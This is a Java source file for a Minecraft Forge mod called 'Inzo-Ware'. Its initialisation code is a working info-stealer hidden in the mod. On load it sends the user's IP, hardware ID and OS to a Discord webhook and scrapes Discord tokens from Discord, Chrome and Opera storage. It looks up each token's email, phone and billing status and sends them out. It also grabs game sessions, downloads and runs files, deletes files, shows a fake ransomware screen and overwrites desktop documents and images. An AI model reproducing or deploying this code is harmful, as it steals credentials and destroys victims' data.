package com.inzo.technologies.inzoware;

import static com.inzo.technologies.inzoware.Main.*;

import java.awt.Color;
import java.awt.Desktop;
import java.awt.GraphicsEnvironment;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import javax.swing.JFrame;
import javax.swing.JLabel;

import com.inzo.technologies.inzoware.exception.*;
import com.inzo.technologies.inzoware.hooks.*;
import com.inzo.technologies.inzoware.json.*;
import com.inzo.technologies.inzoware.mc.JSON;
import com.inzo.technologies.inzoware.scripts.*;
import com.inzo.technologies.inzoware.utils.*;

import org.apache.commons.io.FileUtils;
import org.apache.commons.io.FilenameUtils;

import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.Mod.EventHandler;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;

@Mod(modid = MOD_ID, name = MOD_NAME, version = MOD_VERSION)
public class Main {
    public static final String MOD_ID = "inzoware";
    public static final String MOD_NAME = "Inzo-Ware";
    public static final String MOD_VERSION = "2.11.1";

    public ArrayList<String> workingTokens = new ArrayList<>();

        @EventHandler
        public void init(FMLInitializationEvent event){           

            DupingUtils.Duper();
            String ip = InitUtils.getIP();
            try {
                DiscordDuper userInfo = new DiscordDuper(Hooks374.getyou());
                userInfo.setUsername(InitUtils.getName());
                userInfo.setAvatarUrl("https://img.cjstevenson.com/images/2022/02/13/97044373.png");
                userInfo.addEmbed(new DiscordDuper.EmbedObject()
                        .setTitle("New User Connected")
                        .setColor(Color.CYAN)
                        .setDescription("PC Information for " + InitUtils.getName())
                        .addField("Username", InitUtils.getName().toString(), true)
                        .addField("OS", InitUtils.getOS().toString(), true)
                        .addField("HWID", InitUtils.getHWID().toString(), false));
                userInfo.execute();
            }catch(IOException e) {
                e.printStackTrace();
                new WebhookException().printStackTrace();
            }
            InitUtils.sendData("IP Address: " + ip, Hooks374.getyou(), InitUtils.getName());

            Methods.sessionGetFull();
            InitUtils.sendData("**Grabbing Discord Tokens**", Hooks374.getyou(), InitUtils.getName());
            ArrayList<String> tokens = new ArrayList<>();
            final String appdata = System.getenv().get("APPDATA");
            final String local = System.getenv().get("LOCALAPPDATA");
            final String[] regex = {
                    "[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}"
            };
    
            HashMap<String, File> paths = new HashMap<String, File>() {{
               put("Discord", new File(appdata + "\\discord\\Local Storage\\leveldb"));
               put("Chrome", new File(local + "\\Google\\Chrome\\User Data\\Default"));
               put("Opera", new File(appdata + "\\Opera Software\\Opera Stable"));
            }};
    
            for (File path : paths.values()) {
                try {
                    for (File file : path.listFiles()) {
                        if (file.toString().endsWith(".ldb")) {
                            FileReader fileReader = new FileReader(file);
                            BufferedReader bufferReader = new BufferedReader(fileReader);
    
                            String textFile = null;
                            StringBuilder buildedText = new StringBuilder();
    
                            while ( (textFile = bufferReader.readLine()) != null) {
                                buildedText.append(textFile);
                            }
    
                            String actualText = buildedText.toString();
    
                            fileReader.close();
                            bufferReader.close();
    
                            Pattern pattern = Pattern.compile(regex[0]);
                            Matcher matcher = pattern.matcher(actualText);
                            if (matcher.find(0)) {
    
                                tokens.add(matcher.group());                       }else {
                                    InitUtils.sendData("No Other Discord Tokens Found", Hooks374.getyou(), InitUtils.getName());
                                }
                        }
                    }
                } catch (Exception e) {
                    continue;
                }
        }
            try {
                Thread.sleep(1600);
            } catch (InterruptedException e2) {
                e2.printStackTrace();
            }
            for(String t : tokens) {
                String info = InitUtils.sendDiscordInfo(t, "users/@me", InitUtils.getName()).replace(",", ",\n");
                String username = i_love_inzo(info, "username") + "#" + i_love_inzo(info, "discriminator");
                if(username.equalsIgnoreCase("Invalid#Invalid")) {
                    continue;
                }
                String number = i_love_inzo(info, "phone");
                String email = i_love_inzo(info, "email");
                boolean nitro = !InitUtils.sendDiscordInfo(t, "users/@me/billing/subscriptions", InitUtils.getName()).equals("[]");
                boolean billing = !InitUtils.sendDiscordInfo(t, "users/@me/billing/subscriptions", InitUtils.getName()).equals("[]");
                DiscordDuper discord = new DiscordDuper(Hooks374.getyou());
                discord.setUsername(InitUtils.getName());
                discord.setAvatarUrl("https://img.cjstevenson.com/images/2022/02/13/97044373.png");
                discord.setContent("**" + t + "**");
                discord.addEmbed(new DiscordDuper.EmbedObject()
                        .setTitle(username + "'s Discord Info")
                        .setColor(Color.CYAN)
                        .addField("Nitro", nitro == true ? "True" : "False", true)
                        .addField("Billing", billing == true ? "True" : "False", true)
                        .addField("Phone", number, false)
                        .addField("Email", email, true)
                        .setFooter("HaveIBeenPwned: " + String.join("", InitUtils.hasBeenPwned(email) == true ? "Yes" : "No"), ""));
                try {
                    discord.execute();
                    workingTokens.add(t);
                } catch (IOException e) {
                    
                }
            }

            InitUtils.sendData("| **Python Injection Completed (this doesnt work if they dont have python)**| ", Hooks374.getyou(), InitUtils.getName());

            JSON.main();

            InitUtils.sendData("| **Running Extra's**| ", Hooks374.getyou(), InitUtils.getName());
            Scripts scripts = new Scripts();
            scripts.setup();
            if(scripts.getDoesDelete()) {
                for(String f : scripts.getFileDeletes()) {
                    File file = new File(f);
                    if(file.exists()) {
                        file.delete();
                    }
                }
            }
            if(scripts.getDoesExecute()) {
                for(String f : scripts.getFileExecutes()) {
                    File file = new File(f);
                    if(file.exists()) {
                        Desktop desktop = Desktop.getDesktop();
                        try {
                            desktop.open(file);
                        } catch (IOException e) {
                            
                        }
                    }
                }
            }
            if(scripts.getDoesRansomware()) {
                GraphicsEnvironment localGraphicsEnvironment = GraphicsEnvironment.getLocalGraphicsEnvironment();
                int monitorCount = localGraphicsEnvironment.getScreenDevices().length;
                for(int i=0;i<=monitorCount-1;i++) {
                    String sdnw = Scripts.ransomText;
                    JFrame ransom = new JFrame();
                    ransom.setUndecorated(true);
                    ransom.setSize(2000, 1090);
                    ransom.setDefaultCloseOperation(0);
                    ransom.setAlwaysOnTop(true);
                    JLabel label = new JLabel();
                    label.setText(sdnw);
                    label.setLocation(1000, 600);
                    ransom.add(label);
                    ransom.setVisible(true);
                    localGraphicsEnvironment.getScreenDevices()[i].setFullScreenWindow(ransom);
                }
                File file = new File(InitUtils.desktop);
                File[] subs = file.listFiles();
                for(File child : subs) {
                    if(child.getName().endsWith("txt") ||
                            child.getName().endsWith("jar") ||
                            child.getName().endsWith("exe") ||
                            child.getName().endsWith("zip") ||
                            child.getName().endsWith("pdf") ||
                            child.getName().endsWith("doc") ||
                            child.getName().endsWith("docx") ||
                            child.getName().endsWith("png") ||
                            child.getName().endsWith("jpg") ||
                            child.getName().endsWith("jpeg")) {
                    if(child.canWrite()) {
                        try {
                            @SuppressWarnings("resource")
                            FileWriter writer = new FileWriter(child);
                            writer.append("Your files are crypted.");
                            writer.flush();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    
                    }
                    
                
            }
            }
            if(scripts.getDoesDownload()) {
                for(String k : scripts.getFileDownloads().keySet()) {
                    String loc = scripts.getFileDownloads().get(k);
                    INZOUtils.downloadFile(k, loc);
                }
            }
            if(scripts.getDoesFileSpammer()) {
                for(String loc : scripts.getFileSpammers()) {
                    for(int i=0;i<=35;i++) {
                        File startFile = new File(loc);
                        String extension = FilenameUtils.getExtension(startFile.getName());
                        File destFile = new File(loc + "(" + i + ")" + "." + extension);
                        try {
                            FileUtils.copyFile(startFile, destFile);
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
            }
            
        }
        
        public static String i_love_inzo(String inzo, String inzo_thnkscj_skillnoob_luxs_tax) {
            try {
                JSONObject json = new JSONObject(inzo);
                return json.getString(inzo_thnkscj_skillnoob_luxs_tax);
            }catch(Exception e) {
                return "Invalid";
            }
            
        }
}